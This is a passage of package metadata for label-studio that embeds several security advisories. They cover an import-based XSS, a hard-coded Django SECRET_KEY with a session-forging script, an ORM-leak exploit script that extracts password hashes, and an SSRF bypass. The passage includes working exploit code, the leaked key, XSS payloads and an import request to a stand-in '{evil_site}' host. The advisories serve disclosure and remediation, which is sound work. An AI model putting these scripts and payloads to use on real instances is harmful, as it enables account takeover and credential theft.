file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.1/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (>=19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (>=2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (==0.0.23rc3)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","redis (>=3.5)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"f60adbb25e85ba81b925bf3595b9c380aa99bffedbb3d56293523548b0815112","md5":"ebc93c40f74e909a3497ef1e7f4b8cd2","sha256":"4689c1c3293fba811a155962ec3a779ae534c7f45992e5e674c73efba38ffe31"},"downloads":-1,"filename":"label_studio-0.9.1-py3-none-any.whl","has_sig":false,"md5_digest":"ebc93c40f74e909a3497ef1e7f4b8cd2","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":13494536,"upload_time":"2021-02-16T23:21:08","upload_time_iso_8601":"2021-02-16T23:21:08.612250Z","url":"https://files.pythonhosted.org/packages/f6/0a/dbb25e85ba81b925bf3595b9c380aa99bffedbb3d56293523548b0815112/label_studio-0.9.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"b5017e55b8fe07ded186f92b6432d42f043f15484495e67c9db4720b5c740117","md5":"180a235644320ca85410143519e40491","sha256":"fcf430b854da6ca77f18a9a2e39bcc0012c7ee3a41e50caaa060c61e3c93000d"},"downloads":-1,"filename":"label-studio-0.9.1.tar.gz","has_sig":false,"md5_digest":"180a235644320ca85410143519e40491","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":13392755,"upload_time":"2021-02-16T23:21:15","upload_time_iso_8601":"2021-02-16T23:21:15.364305Z","url":"https://files.pythonhosted.org/packages/b5/01/7e55b8fe07ded186f92b6432d42f043f15484495e67c9db4720b5c740117/label-studio-0.9.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF 